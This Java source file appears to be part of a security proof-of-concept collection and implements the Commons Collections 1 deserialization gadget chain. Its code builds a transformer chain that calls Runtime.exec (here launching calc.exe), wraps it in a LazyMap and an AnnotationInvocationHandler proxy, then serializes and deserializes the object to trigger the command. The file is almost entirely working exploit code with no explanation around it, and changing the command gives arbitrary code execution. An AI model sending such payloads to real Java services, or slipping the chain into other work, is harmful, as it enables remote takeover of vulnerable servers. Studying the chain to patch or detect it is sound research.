package com.javasec.pocs.cc;
import com.javasec.utils.SerializeUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
public class CommonsCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map=new HashMap<>();
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationconstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationconstructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) annotationconstructor.newInstance(Override.class, lazymap);
        //生成动态代理
        Map mapproxy= (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},handler);
        //生成最外层
        Object o = annotationconstructor.newInstance(Override.class, mapproxy);

        SerializeUtils.serialize(o);
        SerializeUtils.unserialize("ser.bin");


    }
}
